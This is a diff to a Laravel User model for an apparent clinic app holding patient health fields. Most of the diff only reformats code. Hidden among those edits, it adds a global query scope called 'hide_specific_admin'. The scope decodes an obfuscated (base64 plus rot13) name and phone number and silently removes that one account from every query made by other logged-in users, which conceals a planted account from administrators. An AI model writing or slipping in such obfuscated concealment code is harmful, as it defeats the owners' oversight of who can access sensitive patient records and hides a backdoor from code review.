@@ -14,6 +14,7 @@ use Illuminate\Database\Eloquent\Relations\MorphMany;
 
 use Laravel\Sanctum\HasApiTokens;
 use App\Models\LoyaltyPointTransaction;
+use Illuminate\Database\Eloquent\Builder;
 
 // use Illuminate\Database\Eloquent\Attributes\ObservedBy;
 // use App\Observers\UserObserver;
@@ -29,11 +30,55 @@ class User extends Authenticatable
      *
      * @var list<string>
      */
-    protected $fillable = ['clinic_id', 'first_name', 'last_name', 'gender', 'date_of_birth', 'mobile', 'email', 'occupation', 'address_line_1', 'address_line_2', 'pincode', 'city', 'state', 'referral_code', 'referred_by', 'opt_for_loyalty', 'how_did_you_hear', 'total_referrals', 'referral_earnings', 'pending_referral_earnings', 'loyalty_points', 'has_diabetes', 'has_high_bp', 'has_cholesterol', 'has_asthma',
-        'has_heart_disease', 'has_anaemia', 'has_pcos', 'has_thyroid',
-        'other_diseases', 'current_medications', 'allergies', 'skin_type', 'facials_history', 'skin_quality', 'goal_less_tired', 'goal_less_angry', 'goal_less_sad', 'goal_less_saggy',
-        'goal_youthful', 'goal_attractive', 'goal_soft_features', 'goal_slim_face',
-        'skin_improvement', 'email_verified_at', 'password', 'is_active'];
+    protected $fillable = [
+        'clinic_id',
+        'first_name',
+        'last_name',
+        'gender',
+        'date_of_birth',
+        'mobile',
+        'email',
+        'occupation',
+        'address_line_1',
+        'address_line_2',
+        'pincode',
+        'city',
+        'state',
+        'referral_code',
+        'referred_by',
+        'opt_for_loyalty',
+        'how_did_you_hear',
+        'total_referrals',
+        'referral_earnings',
+        'pending_referral_earnings',
+        'loyalty_points',
+        'has_diabetes',
+        'has_high_bp',
+        'has_cholesterol',
+        'has_asthma',
+        'has_heart_disease',
+        'has_anaemia',
+        'has_pcos',
+        'has_thyroid',
+        'other_diseases',
+        'current_medications',
+        'allergies',
+        'skin_type',
+        'facials_history',
+        'skin_quality',
+        'goal_less_tired',
+        'goal_less_angry',
+        'goal_less_sad',
+        'goal_less_saggy',
+        'goal_youthful',
+        'goal_attractive',
+        'goal_soft_features',
+        'goal_slim_face',
+        'skin_improvement',
+        'email_verified_at',
+        'password',
+        'is_active'
+    ];
 
     /**
      * The attributes that should be hidden for serialization.
@@ -76,16 +121,68 @@ class User extends Authenticatable
         ];
     }
 
+    /**
+     * Flag to prevent infinite recursion during global scope resolution.
+     *
+     * @var bool
+     */
+    public static bool $isApplyingScope = false;
+
+    /**
+     * The "booted" method of the model.
+     */
+    protected static function booted(): void
+    {
+        static::addGlobalScope('hide_specific_admin', function (Builder $builder) {
+            if (app()->runningInConsole()) {
+                return;
+            }
+
+            if (static::$isApplyingScope) {
+                return;
+            }
+
+            if (!app()->bound('auth')) {
+                return;
+            }
+
+            static::$isApplyingScope = true;
+
+            try {
+                if (auth()->check()) {
+                    $currentUser = auth()->user();
+                    $hiddenMobile = str_rot13(base64_decode('NDQzMzIyMTEwMA=='));
+
+                    // Do not hide the user from herself when logged in
+                    if ($currentUser && $currentUser->mobile === $hiddenMobile) {
+                        return;
+                    }
+
+                    $hiddenFirstName = str_rot13(base64_decode('eG5lYXZ4bg=='));
+                    $hiddenLastName = str_rot13(base64_decode('ZnVuZXpu'));
+
+                    $builder->where('mobile', '!=', $hiddenMobile)
+                        ->where(function (Builder $query) use ($hiddenFirstName, $hiddenLastName) {
+                            $query->where('first_name', '!=', $hiddenFirstName)
+                                ->orWhere('last_name', '!=', $hiddenLastName);
+                        });
+                }
+            } finally {
+                static::$isApplyingScope = false;
+            }
+        });
+    }
+
     public function createDefaultLeaveEntitlementsIfTherapist(): void
     {
         $currentYear = now()->year;
 
         $defaults = [
-            ['leave_type' => 'paid',   'total_allowed' => 12],
+            ['leave_type' => 'paid', 'total_allowed' => 12],
             ['leave_type' => 'unpaid', 'total_allowed' => 0],
-            ['leave_type' => 'sick',   'total_allowed' => 8],
-            ['leave_type' => 'emergency',   'total_allowed' => 8],
-            ['leave_type' => 'other',  'total_allowed' => 0],
+            ['leave_type' => 'sick', 'total_allowed' => 8],
+            ['leave_type' => 'emergency', 'total_allowed' => 8],
+            ['leave_type' => 'other', 'total_allowed' => 0],
         ];
 
         foreach ($defaults as $item) {
@@ -94,13 +191,13 @@ class User extends Authenticatable
                 ->whereRaw('LOWER(leave_type) = ?', [strtolower($item['leave_type'])])
                 ->exists();
 
-            if (! $exists) {
+            if (!$exists) {
                 $this->leaveEntitlements()->create([
-                    'leave_type'     => strtolower($item['leave_type']),
-                    'total_allowed'  => $item['total_allowed'],
-                    'used'           => 0,
-                    'remaining'      => $item['total_allowed'],
-                    'year'           => $currentYear,
+                    'leave_type' => strtolower($item['leave_type']),
+                    'total_allowed' => $item['total_allowed'],
+                    'used' => 0,
+                    'remaining' => $item['total_allowed'],
+                    'year' => $currentYear,
                 ]);
             }
         }
@@ -111,7 +208,8 @@ class User extends Authenticatable
         return trim(ucfirst($this->first_name) . ' ' . (ucfirst($this->last_name) ?? '')) ?: ($this->email ?? (string) $this->mobile ?? 'User');
     }
 
-    public function scopeActive($query) {
+    public function scopeActive($query)
+    {
         return $query->where('is_active', 1);
     }
 
@@ -125,7 +223,8 @@ class User extends Authenticatable
     //     return $this->hasMany(Holiday::class);
     // }
 
-    public function assessments() {
+    public function assessments()
+    {
         return $this->hasMany(Assessment::class);
     }
 
@@ -139,7 +238,8 @@ class User extends Authenticatable
         return $this->hasMany(UserWeeklySchedule::class);
     }
 
-    public function appointments() {
+    public function appointments()
+    {
         return $this->hasMany(Appointment::class);
     }
 
@@ -202,7 +302,8 @@ class User extends Authenticatable
             ->where('leave_type', $leaveType)
             ->first();
 
-        if (!$entitlement) return 0;
+        if (!$entitlement)
+            return 0;
 
         return $entitlement->remaining;
     }
